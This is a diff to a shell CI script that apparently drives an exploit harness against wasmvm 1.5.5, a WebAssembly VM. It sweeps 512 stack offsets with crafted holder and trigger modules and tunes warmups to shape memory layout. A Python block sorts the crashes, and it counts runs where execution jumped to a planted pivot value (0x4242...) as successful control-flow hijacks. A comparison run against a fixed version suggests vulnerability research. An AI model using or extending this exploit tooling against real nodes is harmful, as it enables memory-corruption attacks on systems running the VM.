@@ -116,7 +116,9 @@ if [ -n "$PY" ]; then
     echo "  $MODE fixed: $(grep -m1 'query gas' "ci-out/harness/probe-$MODE-fixed.stderr" | cut -c1-160)" | tee -a "$OUT/sweep.log"
   done
 
-  echo "--- vulnerable sweep (wasmvm 1.5.5, r=0..511 = all phases): crash = cross-stack hijack ---"
+  echo "--- vulnerable sweep (wasmvm 1.5.5, r=0..511 = all phases, warmups=3):" >&2
+  echo "    geometry: odd warmups => pool [lower B (holder)][guard][upper A (trigger)]; the" >&2
+  echo "    stream descends from the trigger into the holder. 4 warmups = reversed (control)." >&2
   CRASHES=0
   for R in $(seq 0 511); do
     OFF=$((512 - R))
@@ -126,7 +128,7 @@ if [ -n "$PY" ]; then
     for w in holder trigger benign; do
       "$PY" -c "import wasmtime; open('$D/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D/$w.wat').read()))" 2>/dev/null
     done
-    if timeout 120 ./harness/harness -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 4 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-r$R.json" > "ci-out/harness/nested-vuln-r$R.stdout" 2> "ci-out/harness/nested-vuln-r$R.stderr"; then
+    if timeout 120 ./harness/harness -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-r$R.json" > "ci-out/harness/nested-vuln-r$R.stdout" 2> "ci-out/harness/nested-vuln-r$R.stderr"; then
       :
     else
       echo "  r$R CRASH/exit=$?" | tee -a "$OUT/sweep.log"
@@ -141,29 +143,32 @@ if [ -n "$PY" ]; then
   else
     echo "  fixed r256 CRASH/exit=$?" | tee -a "$OUT/sweep.log"
   fi
-  echo "--- nested summary (classified crashes) ---"
+  echo "--- nested summary (classified) ---"
   python3 - <<'PYEOF'
 import glob, os, json, re
-crashes, oks, marker = [], [], []
+marker, holder, trigger, hit, clean = [], [], [], [], []
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-r*.stderr"), key=lambda p: int(p.split("-r")[-1].split(".")[0])):
     r = int(f.split("-r")[-1].split(".")[0])
     j = f.replace(".stderr", ".json")
     txt = open(f, errors="replace").read()
-    if not os.path.exists(j) or os.path.getsize(j) == 0:
-        mp = re.search(r'PC=0x([0-9a-f]+)', txt)
-        ma = re.search(r'addr=0x([0-9a-f]+)', txt)
-        pc = mp.group(1) if mp else "?"
-        ad = ma.group(1) if ma else "?"
-        # marker hijack: execution reached the planted pivot value 0x0042424242424242
-        if pc.startswith("4242") or ad.startswith("4242") or "0x4242424242" in txt:
-            marker.append(r)
-        else:
-            crashes.append((r, pc, ad))
+    if os.path.exists(j) and os.path.getsize(j) > 0:
+        jt = open(j, errors="replace").read()
+        (hit if '"hit"' in jt else clean).append(r)
+        continue
+    mp = re.search(r'PC=0x([0-9a-f]+)', txt)
+    pc = mp.group(1) if mp else "?"
+    if pc.startswith("4242"):
+        marker.append(r)                      # execution jumped to the planted pivot 0x4242...
+    elif "nestedQuerier" in txt:
+        trigger.append((r, pc))               # crash inside the nested trigger (stream off stack)
     else:
-        oks.append(r)
-print("vuln crashes (memfault):", len(crashes), [f"r{r}@PC=0x{pc}" for r, pc, ad in crashes[:40]])
-print("vuln marker-hijacks   :", len(marker), marker[:40])
-print("vuln clean            :", len(oks), oks[:16])
+        holder.append((r, pc))                # crash after the query returned (holder corrupted!)
+# marker-hijack = the aimed-pivot milestone; holder-side = corruption confirmed
+print("MARKER-HIJACKS (PC=0x4242..):", len(marker), marker[:80])
+print("holder-side crashes        :", len(holder), [f"r{r}@0x{pc}" for r, pc in holder[:60]])
+print("trigger-side crashes       :", len(trigger), [f"r{r}" for r, pc in trigger[:40]])
+print("holder-touched (hit attr)  :", len(hit), hit[:80])
+print("clean completed            :", len(clean))
 f = "ci-out/harness/nested-fixed-r256.json"
 if os.path.exists(f) and os.path.getsize(f):
     d = json.load(open(f))
